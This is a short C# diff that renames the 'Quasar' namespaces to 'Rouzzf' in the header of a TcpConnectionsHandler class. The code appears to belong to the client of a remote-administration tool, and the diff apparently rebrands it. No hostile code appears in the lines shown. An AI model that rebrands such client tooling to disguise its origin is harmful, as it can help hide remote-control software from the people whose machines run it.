@@ -1,12 +1,12 @@
-﻿using Quasar.Client.Utilities;
-using Quasar.Common.Enums;
-using Quasar.Common.Messages;
-using Quasar.Common.Models;
-using Quasar.Common.Networking;
+﻿using Rouzzf.Client.Utilities;
+using Rouzzf.Common.Enums;
+using Rouzzf.Common.Messages;
+using Rouzzf.Common.Models;
+using Rouzzf.Common.Networking;
 using System;
 using System.Runtime.InteropServices;
 
-namespace Quasar.Client.Messages
+namespace Rouzzf.Client.Messages
 {
     public class TcpConnectionsHandler : IMessageProcessor
     {
